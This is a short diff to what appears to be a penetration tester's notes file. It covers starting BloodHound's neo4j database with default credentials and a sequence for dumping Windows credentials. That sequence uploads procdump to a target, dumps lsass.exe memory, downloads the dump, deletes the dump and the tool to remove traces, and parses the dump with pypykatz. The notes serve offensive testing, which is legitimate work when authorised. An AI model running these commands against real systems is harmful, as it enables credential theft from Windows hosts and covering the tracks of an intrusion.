@@ -341,7 +341,7 @@ jxplorer
 
 
 #bloodhound
-neo4j console
+sudo neo4j console
 default creds: neo4j/neo4j
 http://localhost:7474/
 change password
@@ -588,8 +588,10 @@ put /opt/sysinternals/procdump64.exe
 procdump64 -accepteula -64 -ma lsass.exe lsassdump
 get lsassdump.dmp
 del lsassdump.dmp
+del procdump64.exe
+pypykatz lsa minidump lsassdump.dmp
 
-pypykatz minidump lsassdump.dmp
+
 
 
 ###################################
